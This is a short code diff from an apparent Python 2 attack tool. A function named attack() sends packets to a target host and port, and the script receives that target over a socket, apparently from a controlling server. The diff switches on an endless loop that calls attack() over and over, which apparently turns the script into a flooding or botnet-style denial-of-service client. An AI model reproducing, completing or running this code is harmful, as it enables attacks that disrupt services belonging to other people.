@@ -19,6 +19,7 @@ def attack(host="",port=80):
             if sock.connect_ex((host,port)) == 0:
                 if sock.sendall(packet) == None:
                     print"Packet sent successfully!"
+                    #print sock.recv(1024)        # Prints echo from test_server
                     sock.close()
                 else:
                     print"Error while sending!"
@@ -35,7 +36,7 @@ if __name__ == "__main__":
     target_host, target_port = data.split()[-2:]
     target_port = int(target_port)
     print 'Target Host Address: '+target_host+'\nTarget Port Number: '+str(target_port)
-    s.close()                     # Close the socket when done testnew
+    s.close()                     # Close the socket when done test
 
-#    while True:
-#        attack(target_host, target_port)
+    while True:
+        attack(target_host, target_port)
